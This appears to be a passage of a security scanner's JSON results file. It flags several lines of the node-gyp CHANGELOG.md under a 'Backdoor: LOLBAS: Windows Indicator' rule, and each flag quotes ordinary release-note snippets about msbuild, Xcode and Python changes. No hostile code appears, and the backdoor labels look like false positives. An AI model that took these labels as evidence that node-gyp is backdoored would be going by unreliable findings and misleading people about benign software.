                      "text": "* [[`0c6bf530a0`](https://github.com/nodejs/node-gyp/commit/0c6bf530a0)] - **lib**: use print() for python version detection (GreenAddress) [#1534](https://github.com/nodejs/node-gyp/pull/1534)\n\n## v3.8.0 2018-08-09\n\n* [[`c5929cb4fe`](https://github.com/nodejs/node-gyp/commit/c5929cb4fe)] - **doc**: update Xcode preferences tab name. (Ivan Daniluk) [#1330](https://github.com/nodejs/node-gyp/pull/1330)\n* [[`8b488da8b9`](https://github.com/nodejs/node-gyp/commit/8b488da8b9)] - **doc**: update link to commit guidelines (Jonas Hermsmeier) [#1456](https://github.com/nodejs/node-gyp/pull/1456)\n* [[`b4fe8c16",
                      "markdown": "`* [[`0c6bf530a0`](https://github.com/nodejs/node-gyp/commit/0c6bf530a0)] - **lib**: use print() for python version detection (GreenAddress) [#1534](https://github.com/nodejs/node-gyp/pull/1534)\n\n## v3.8.0 2018-08-09\n\n* [[`c5929cb4fe`](https://github.com/nodejs/node-gyp/commit/c5929cb4fe)] - **doc**: update Xcode preferences tab name. (Ivan Daniluk) [#1330](https://github.com/nodejs/node-gyp/pull/1330)\n* [[`8b488da8b9`](https://github.com/nodejs/node-gyp/commit/8b488da8b9)] - **doc**: update link to commit guidelines (Jonas Hermsmeier) [#1456](https://github.com/nodejs/node-gyp/pull/1456)\n* [[`b4fe8c16`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 747,
                  "startColumn": 87,
                  "endLine": 747,
                  "endColumn": 96,
                  "snippet": {
                    "text": "m/nodejs/node-gyp/pull/1670)\n* [[`45e3221fd4`](https://github.com/nodejs/node-gyp/commit/45e3221fd4)] - Remove an outdated workaround for Python 2.4 (cclauss) [#1650](https://github.com/nodejs/node-gyp/pull/1650)\n* [[`721dc7d314`](https://github.com/nodejs/node-gyp/commit/721dc7d314)] - Add ARM64 to MSBuild /Platform logic (Jon Kunkee) [#1655](https://github.com/nodejs/node-gyp/pull/1655)\n* [[`a5b7410497`](https://github.com/nodejs/node-gyp/commit/a5b7410497)] - Add ESLint no-unused-vars rule (Jon Moss) [#1497](https://github.com/nodejs/node-gyp/pull/1497)\n\n## v4.0.0 2019-04-24\n\n* [[`ceed5cbe10`](https",
                    "rendered": {
                      "text": "m/nodejs/node-gyp/pull/1670)\n* [[`45e3221fd4`](https://github.com/nodejs/node-gyp/commit/45e3221fd4)] - Remove an outdated workaround for Python 2.4 (cclauss) [#1650](https://github.com/nodejs/node-gyp/pull/1650)\n* [[`721dc7d314`](https://github.com/nodejs/node-gyp/commit/721dc7d314)] - Add ARM64 to MSBuild /Platform logic (Jon Kunkee) [#1655](https://github.com/nodejs/node-gyp/pull/1655)\n* [[`a5b7410497`](https://github.com/nodejs/node-gyp/commit/a5b7410497)] - Add ESLint no-unused-vars rule (Jon Moss) [#1497](https://github.com/nodejs/node-gyp/pull/1497)\n\n## v4.0.0 2019-04-24\n\n* [[`ceed5cbe10`](https",
                      "markdown": "`m/nodejs/node-gyp/pull/1670)\n* [[`45e3221fd4`](https://github.com/nodejs/node-gyp/commit/45e3221fd4)] - Remove an outdated workaround for Python 2.4 (cclauss) [#1650](https://github.com/nodejs/node-gyp/pull/1650)\n* [[`721dc7d314`](https://github.com/nodejs/node-gyp/commit/721dc7d314)] - Add ARM64 to MSBuild /Platform logic (Jon Kunkee) [#1655](https://github.com/nodejs/node-gyp/pull/1655)\n* [[`a5b7410497`](https://github.com/nodejs/node-gyp/commit/a5b7410497)] - Add ESLint no-unused-vars rule (Jon Moss) [#1497](https://github.com/nodejs/node-gyp/pull/1497)\n\n## v4.0.0 2019-04-24\n\n* [[`ceed5cbe10`](https`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 744,
                  "startColumn": 74,
                  "endLine": 744,
                  "endColumn": 82,
                  "snippet": {
                    "text": " the configure stage (Bartosz Sosnowski) [#1654](https://github.com/nodejs/node-gyp/pull/1654)\n* [[`d3b21220a0`](https://github.com/nodejs/node-gyp/commit/d3b21220a0)] - **win**: fix delay-load hook for electron 4 (Andy Dill)\n* [[`81f3a92338`](https://github.com/nodejs/node-gyp/commit/81f3a92338)] - Update list of Node.js versions to test against. (Ben Noordhuis) [#1670](https://github.com/nodejs/node-gyp/pull/1670)\n* [[`4748f6ab75`](https://github.com/nodejs/node-gyp/commit/4748f6ab75)] - Remove deprecated compatibility code. (Ben Noordhuis) [#1670](https://github.com/nodejs/node-gyp/pull/1670)\n* [[`",
                    "rendered": {
                      "text": " the configure stage (Bartosz Sosnowski) [#1654](https://github.com/nodejs/node-gyp/pull/1654)\n* [[`d3b21220a0`](https://github.com/nodejs/node-gyp/commit/d3b21220a0)] - **win**: fix delay-load hook for electron 4 (Andy Dill)\n* [[`81f3a92338`](https://github.com/nodejs/node-gyp/commit/81f3a92338)] - Update list of Node.js versions to test against. (Ben Noordhuis) [#1670](https://github.com/nodejs/node-gyp/pull/1670)\n* [[`4748f6ab75`](https://github.com/nodejs/node-gyp/commit/4748f6ab75)] - Remove deprecated compatibility code. (Ben Noordhuis) [#1670](https://github.com/nodejs/node-gyp/pull/1670)\n* [[`",
                      "markdown": "` the configure stage (Bartosz Sosnowski) [#1654](https://github.com/nodejs/node-gyp/pull/1654)\n* [[`d3b21220a0`](https://github.com/nodejs/node-gyp/commit/d3b21220a0)] - **win**: fix delay-load hook for electron 4 (Andy Dill)\n* [[`81f3a92338`](https://github.com/nodejs/node-gyp/commit/81f3a92338)] - Update list of Node.js versions to test against. (Ben Noordhuis) [#1670](https://github.com/nodejs/node-gyp/pull/1670)\n* [[`4748f6ab75`](https://github.com/nodejs/node-gyp/commit/4748f6ab75)] - Remove deprecated compatibility code. (Ben Noordhuis) [#1670](https://github.com/nodejs/node-gyp/pull/1670)\n* [[``"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 742,
                  "startColumn": 87,
                  "endLine": 742,
                  "endColumn": 96,
                  "snippet": {
                    "text": "/1762)\n* [[`7fe4095974`](https://github.com/nodejs/node-gyp/commit/7fe4095974)] - **(SEMVER-MAJOR)** **win**: generic Visual Studio 2017 detection (João Reis) [#1762](https://github.com/nodejs/node-gyp/pull/1762)\n* [[`7a71d68bce`](https://github.com/nodejs/node-gyp/commit/7a71d68bce)] - **win**: use msbuild from the configure stage (Bartosz Sosnowski) [#1654](https://github.com/nodejs/node-gyp/pull/1654)\n* [[`d3b21220a0`](https://github.com/nodejs/node-gyp/commit/d3b21220a0)] - **win**: fix delay-load hook for electron 4 (Andy Dill)\n* [[`81f3a92338`](https://github.com/nodejs/node-gyp/commit/81f3a92338",
                    "rendered": {
                      "text": "/1762)\n* [[`7fe4095974`](https://github.com/nodejs/node-gyp/commit/7fe4095974)] - **(SEMVER-MAJOR)** **win**: generic Visual Studio 2017 detection (João Reis) [#1762](https://github.com/nodejs/node-gyp/pull/1762)\n* [[`7a71d68bce`](https://github.com/nodejs/node-gyp/commit/7a71d68bce)] - **win**: use msbuild from the configure stage (Bartosz Sosnowski) [#1654](https://github.com/nodejs/node-gyp/pull/1654)\n* [[`d3b21220a0`](https://github.com/nodejs/node-gyp/commit/d3b21220a0)] - **win**: fix delay-load hook for electron 4 (Andy Dill)\n* [[`81f3a92338`](https://github.com/nodejs/node-gyp/commit/81f3a92338",
                      "markdown": "`/1762)\n* [[`7fe4095974`](https://github.com/nodejs/node-gyp/commit/7fe4095974)] - **(SEMVER-MAJOR)** **win**: generic Visual Studio 2017 detection (João Reis) [#1762](https://github.com/nodejs/node-gyp/pull/1762)\n* [[`7a71d68bce`](https://github.com/nodejs/node-gyp/commit/7a71d68bce)] - **win**: use msbuild from the configure stage (Bartosz Sosnowski) [#1654](https://github.com/nodejs/node-gyp/pull/1654)\n* [[`d3b21220a0`](https://github.com/nodejs/node-gyp/commit/d3b21220a0)] - **win**: fix delay-load hook for electron 4 (Andy Dill)\n* [[`81f3a92338`](https://github.com/nodejs/node-gyp/commit/81f3a92338`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 705,
                  "startColumn": 83,
                  "endLine": 705,
                  "endColumn": 91,
                  "snippet": {
                    "text": "ode-gyp/pull/1689)\n* [[`1597c84aad`](https://github.com/nodejs/node-gyp/commit/1597c84aad)] - **test**: use Travis CI to run tests on every pull request (cclauss) [#1752](https://github.com/nodejs/node-gyp/pull/1752)\n* [[`dd9bf929ac`](https://github.com/nodejs/node-gyp/commit/dd9bf929ac)] - **zos**: update compiler options (Shuowang (Wayne) Zhang) [#1768](https://github.com/nodejs/node-gyp/pull/1768)\n\n## v5.0.1 2019-06-20\n\n* [[`e3861722ed`](https://github.com/nodejs/node-gyp/commit/e3861722ed)] - **doc**: document --jobs max (David Sanders) [#1770](https://github.com/nodejs/node-gyp/pull/1770)\n* [[`1c",
                    "rendered": {
                      "text": "ode-gyp/pull/1689)\n* [[`1597c84aad`](https://github.com/nodejs/node-gyp/commit/1597c84aad)] - **test**: use Travis CI to run tests on every pull request (cclauss) [#1752](https://github.com/nodejs/node-gyp/pull/1752)\n* [[`dd9bf929ac`](https://github.com/nodejs/node-gyp/commit/dd9bf929ac)] - **zos**: update compiler options (Shuowang (Wayne) Zhang) [#1768](https://github.com/nodejs/node-gyp/pull/1768)\n\n## v5.0.1 2019-06-20\n\n* [[`e3861722ed`](https://github.com/nodejs/node-gyp/commit/e3861722ed)] - **doc**: document --jobs max (David Sanders) [#1770](https://github.com/nodejs/node-gyp/pull/1770)\n* [[`1c",
                      "markdown": "`ode-gyp/pull/1689)\n* [[`1597c84aad`](https://github.com/nodejs/node-gyp/commit/1597c84aad)] - **test**: use Travis CI to run tests on every pull request (cclauss) [#1752](https://github.com/nodejs/node-gyp/pull/1752)\n* [[`dd9bf929ac`](https://github.com/nodejs/node-gyp/commit/dd9bf929ac)] - **zos**: update compiler options (Shuowang (Wayne) Zhang) [#1768](https://github.com/nodejs/node-gyp/pull/1768)\n\n## v5.0.1 2019-06-20\n\n* [[`e3861722ed`](https://github.com/nodejs/node-gyp/commit/e3861722ed)] - **doc**: document --jobs max (David Sanders) [#1770](https://github.com/nodejs/node-gyp/pull/1770)\n* [[`1c`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 675,
                  "startColumn": 87,
                  "endLine": 675,
                  "endColumn": 95,
                  "snippet": {
                    "text": "-gyp/pull/1836)\n* [[`fa0ed4aa42`](https://github.com/nodejs/node-gyp/commit/fa0ed4aa42)] - **build**: more Python 3 compat, replace compile with ast (cclauss) [#1820](https://github.com/nodejs/node-gyp/pull/1820)\n* [[`18d5c7c9d0`](https://github.com/nodejs/node-gyp/commit/18d5c7c9d0)] - **win,src**: update win\\_delay\\_load\\_hook.cc to work with /clr (Ivan Petrovic) [#1819](https://github.com/nodejs/node-gyp/pull/1819)\n\n## v5.0.3 2019-07-17\n\n* [[`66ad305775`](https://github.com/nodejs/node-gyp/commit/66ad305775)] - **python**: accept Python 3 conditionally (João Reis) [#1815](https://github.com/nodejs/",
                    "rendered": {
                      "text": "-gyp/pull/1836)\n* [[`fa0ed4aa42`](https://github.com/nodejs/node-gyp/commit/fa0ed4aa42)] - **build**: more Python 3 compat, replace compile with ast (cclauss) [#1820](https://github.com/nodejs/node-gyp/pull/1820)\n* [[`18d5c7c9d0`](https://github.com/nodejs/node-gyp/commit/18d5c7c9d0)] - **win,src**: update win\\_delay\\_load\\_hook.cc to work with /clr (Ivan Petrovic) [#1819](https://github.com/nodejs/node-gyp/pull/1819)\n\n## v5.0.3 2019-07-17\n\n* [[`66ad305775`](https://github.com/nodejs/node-gyp/commit/66ad305775)] - **python**: accept Python 3 conditionally (João Reis) [#1815](https://github.com/nodejs/",
                      "markdown": "`-gyp/pull/1836)\n* [[`fa0ed4aa42`](https://github.com/nodejs/node-gyp/commit/fa0ed4aa42)] - **build**: more Python 3 compat, replace compile with ast (cclauss) [#1820](https://github.com/nodejs/node-gyp/pull/1820)\n* [[`18d5c7c9d0`](https://github.com/nodejs/node-gyp/commit/18d5c7c9d0)] - **win,src**: update win\\_delay\\_load\\_hook.cc to work with /clr (Ivan Petrovic) [#1819](https://github.com/nodejs/node-gyp/pull/1819)\n\n## v5.0.3 2019-07-17\n\n* [[`66ad305775`](https://github.com/nodejs/node-gyp/commit/66ad305775)] - **python**: accept Python 3 conditionally (João Reis) [#1815](https://github.com/nodejs/`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 660,
                  "startColumn": 84,
                  "endLine": 660,
                  "endColumn": 92,
                  "snippet": {
                    "text": "1890)\n* [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* [[`5f3ed92181`](https://github.com/nodejs/node-gyp/commit/5f3ed92181)] - **bin**: fix the usage instructions (Halit Ogunc) [#1888](https://github.com/nodejs/node-gyp/pull/1888)\n* [[`aab118edf1`](https://github.c",
                    "rendered": {
                      "text": "1890)\n* [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* [[`5f3ed92181`](https://github.com/nodejs/node-gyp/commit/5f3ed92181)] - **bin**: fix the usage instructions (Halit Ogunc) [#1888](https://github.com/nodejs/node-gyp/pull/1888)\n* [[`aab118edf1`](https://github.c",
                      "markdown": "`1890)\n* [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* [[`5f3ed92181`](https://github.com/nodejs/node-gyp/commit/5f3ed92181)] - **bin**: fix the usage instructions (Halit Ogunc) [#1888](https://github.com/nodejs/node-gyp/pull/1888)\n* [[`aab118edf1`](https://github.c`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 659,
                  "startColumn": 83,
                  "endLine": 659,
                  "endColumn": 91,
                  "snippet": {
                    "text": "ps://github.com/nodejs/node-gyp/pull/1894)\n* [[`f753c167c5`](https://github.com/nodejs/node-gyp/commit/f753c167c5)] - **gyp**: decode stdout on Python 3 (cclauss) [#1890](https://github.com/nodejs/node-gyp/pull/1890)\n* [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* ",
                    "rendered": {
                      "text": "ps://github.com/nodejs/node-gyp/pull/1894)\n* [[`f753c167c5`](https://github.com/nodejs/node-gyp/commit/f753c167c5)] - **gyp**: decode stdout on Python 3 (cclauss) [#1890](https://github.com/nodejs/node-gyp/pull/1890)\n* [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* ",
                      "markdown": "`ps://github.com/nodejs/node-gyp/pull/1894)\n* [[`f753c167c5`](https://github.com/nodejs/node-gyp/commit/f753c167c5)] - **gyp**: decode stdout on Python 3 (cclauss) [#1890](https://github.com/nodejs/node-gyp/pull/1890)\n* [[`60a4083523`](https://github.com/nodejs/node-gyp/commit/60a4083523)] - **doc**: update xcode install instructions to match Node's BUILDING (Nhan Khong) [#1884](https://github.com/nodejs/node-gyp/pull/1884)\n* [[`19dbc9ac32`](https://github.com/nodejs/node-gyp/commit/19dbc9ac32)] - **deps**: update tar to 4.4.12 (Matheus Marchini) [#1889](https://github.com/nodejs/node-gyp/pull/1889)\n* `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 83,
                  "endLine": 650,
                  "endColumn": 91,
                  "snippet": {
                    "text": "om/nodejs/node-gyp/pull/1902)\n* [[`3834156a92`](https://github.com/nodejs/node-gyp/commit/3834156a92)] - **test**: add Python 3.5 and 3.6 tests on Linux (cclauss) [#1909](https://github.com/nodejs/node-gyp/pull/1909)\n* [[`1196e990d8`](https://github.com/nodejs/node-gyp/commit/1196e990d8)] - **src**: update to standard@14 (Rod Vagg) [#1899](https://github.com/nodejs/node-gyp/pull/1899)\n* [[`53ee7dfe89`](https://github.com/nodejs/node-gyp/commit/53ee7dfe89)] - **gyp**: fix undefined name: cflags --\\> ldflags (Christian Clauss) [#1901](https://github.com/nodejs/node-gyp/pull/1901)\n* [[`5871dcf6c9`](https",
                    "rendered": {
                      "text": "om/nodejs/node-gyp/pull/1902)\n* [[`3834156a92`](https://github.com/nodejs/node-gyp/commit/3834156a92)] - **test**: add Python 3.5 and 3.6 tests on Linux (cclauss) [#1909](https://github.com/nodejs/node-gyp/pull/1909)\n* [[`1196e990d8`](https://github.com/nodejs/node-gyp/commit/1196e990d8)] - **src**: update to standard@14 (Rod Vagg) [#1899](https://github.com/nodejs/node-gyp/pull/1899)\n* [[`53ee7dfe89`](https://github.com/nodejs/node-gyp/commit/53ee7dfe89)] - **gyp**: fix undefined name: cflags --\\> ldflags (Christian Clauss) [#1901](https://github.com/nodejs/node-gyp/pull/1901)\n* [[`5871dcf6c9`](https",
                      "markdown": "`om/nodejs/node-gyp/pull/1902)\n* [[`3834156a92`](https://github.com/nodejs/node-gyp/commit/3834156a92)] - **test**: add Python 3.5 and 3.6 tests on Linux (cclauss) [#1909](https://github.com/nodejs/node-gyp/pull/1909)\n* [[`1196e990d8`](https://github.com/nodejs/node-gyp/commit/1196e990d8)] - **src**: update to standard@14 (Rod Vagg) [#1899](https://github.com/nodejs/node-gyp/pull/1899)\n* [[`53ee7dfe89`](https://github.com/nodejs/node-gyp/commit/53ee7dfe89)] - **gyp**: fix undefined name: cflags --\\> ldflags (Christian Clauss) [#1901](https://github.com/nodejs/node-gyp/pull/1901)\n* [[`5871dcf6c9`](https`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 637,
                  "startColumn": 120,
                  "endLine": 637,
                  "endColumn": 128,
                  "snippet": {
                    "text": "](https://github.com/nodejs/node-gyp/commit/1553081ed6)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [[`0705cae9aa`](https://github.com/nodejs/node-gyp/commit/0705cae9aa)] - **travis**: ignore failed `brew upgrade npm`, update xcode (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`7bfdb6f5bf`](https://github.com/nodejs/node-gyp/commit/7bfdb6f5bf)] - **build**: avoid bare exceptions in xcode\\_emulation.py (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`7edf7658fa`]",
                    "rendered": {
                      "text": "](https://github.com/nodejs/node-gyp/commit/1553081ed6)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [[`0705cae9aa`](https://github.com/nodejs/node-gyp/commit/0705cae9aa)] - **travis**: ignore failed `brew upgrade npm`, update xcode (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`7bfdb6f5bf`](https://github.com/nodejs/node-gyp/commit/7bfdb6f5bf)] - **build**: avoid bare exceptions in xcode\\_emulation.py (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`7edf7658fa`]",
                      "markdown": "`](https://github.com/nodejs/node-gyp/commit/1553081ed6)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [[`0705cae9aa`](https://github.com/nodejs/node-gyp/commit/0705cae9aa)] - **travis**: ignore failed `brew upgrade npm`, update xcode (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`7bfdb6f5bf`](https://github.com/nodejs/node-gyp/commit/7bfdb6f5bf)] - **build**: avoid bare exceptions in xcode\\_emulation.py (Christian Clauss) [#1932](https://github.com/nodejs/node-gyp/pull/1932)\n* [[`7edf7658fa`]`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 635,
                  "startColumn": 84,
                  "endLine": 635,
                  "endColumn": 92,
                  "snippet": {
                    "text": "ejs/node-gyp/pull/1937)\n* [[`7cf507906d`](https://github.com/nodejs/node-gyp/commit/7cf507906d)] - **src,win**: allow 403 errors for arm64 node.lib (Richard Lau) [#1934](https://github.com/nodejs/node-gyp/pull/1934)\n* [[`ad0d182c01`](https://github.com/nodejs/node-gyp/commit/ad0d182c01)] - **deps**: update deps to roughly match current npm@6 (Rod Vagg) [#1920](https://github.com/nodejs/node-gyp/pull/1920)\n* [[`1553081ed6`](https://github.com/nodejs/node-gyp/commit/1553081ed6)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [",
                    "rendered": {
                      "text": "ejs/node-gyp/pull/1937)\n* [[`7cf507906d`](https://github.com/nodejs/node-gyp/commit/7cf507906d)] - **src,win**: allow 403 errors for arm64 node.lib (Richard Lau) [#1934](https://github.com/nodejs/node-gyp/pull/1934)\n* [[`ad0d182c01`](https://github.com/nodejs/node-gyp/commit/ad0d182c01)] - **deps**: update deps to roughly match current npm@6 (Rod Vagg) [#1920](https://github.com/nodejs/node-gyp/pull/1920)\n* [[`1553081ed6`](https://github.com/nodejs/node-gyp/commit/1553081ed6)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [",
                      "markdown": "`ejs/node-gyp/pull/1937)\n* [[`7cf507906d`](https://github.com/nodejs/node-gyp/commit/7cf507906d)] - **src,win**: allow 403 errors for arm64 node.lib (Richard Lau) [#1934](https://github.com/nodejs/node-gyp/pull/1934)\n* [[`ad0d182c01`](https://github.com/nodejs/node-gyp/commit/ad0d182c01)] - **deps**: update deps to roughly match current npm@6 (Rod Vagg) [#1920](https://github.com/nodejs/node-gyp/pull/1920)\n* [[`1553081ed6`](https://github.com/nodejs/node-gyp/commit/1553081ed6)] - **test**: upgrade Linux Travis CI to Python 3.8 (Christian Clauss) [#1923](https://github.com/nodejs/node-gyp/pull/1923)\n* [`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 603,
                  "startColumn": 83,
                  "endLine": 603,
                  "endColumn": 91,
                  "snippet": {
                    "text": "/pull/2063)\n\n## v5.1.0 2020-02-05\n\n* [[`f37a8b40d0`](https://github.com/nodejs/node-gyp/commit/f37a8b40d0)] - **doc**: add GitHub Actions badge (#1994) (Rod Vagg) [#1994](https://github.com/nodejs/node-gyp/pull/1994)\n* [[`cb3f6aae5e`](https://github.com/nodejs/node-gyp/commit/cb3f6aae5e)] - **doc**: update macOS\\_Catalina.md (#1992) (James Home) [#1992](https://github.com/nodejs/node-gyp/pull/1992)\n* [[`0607596a4c`](https://github.com/nodejs/node-gyp/commit/0607596a4c)] - **doc**: fix typo in README.md (#1985) (Suraneti Rodsuwan) [#1985](https://github.com/nodejs/node-gyp/pull/1985)\n* [[`0d5a415a14`](",
                    "rendered": {
                      "text": "/pull/2063)\n\n## v5.1.0 2020-02-05\n\n* [[`f37a8b40d0`](https://github.com/nodejs/node-gyp/commit/f37a8b40d0)] - **doc**: add GitHub Actions badge (#1994) (Rod Vagg) [#1994](https://github.com/nodejs/node-gyp/pull/1994)\n* [[`cb3f6aae5e`](https://github.com/nodejs/node-gyp/commit/cb3f6aae5e)] - **doc**: update macOS\\_Catalina.md (#1992) (James Home) [#1992](https://github.com/nodejs/node-gyp/pull/1992)\n* [[`0607596a4c`](https://github.com/nodejs/node-gyp/commit/0607596a4c)] - **doc**: fix typo in README.md (#1985) (Suraneti Rodsuwan) [#1985](https://github.com/nodejs/node-gyp/pull/1985)\n* [[`0d5a415a14`](",
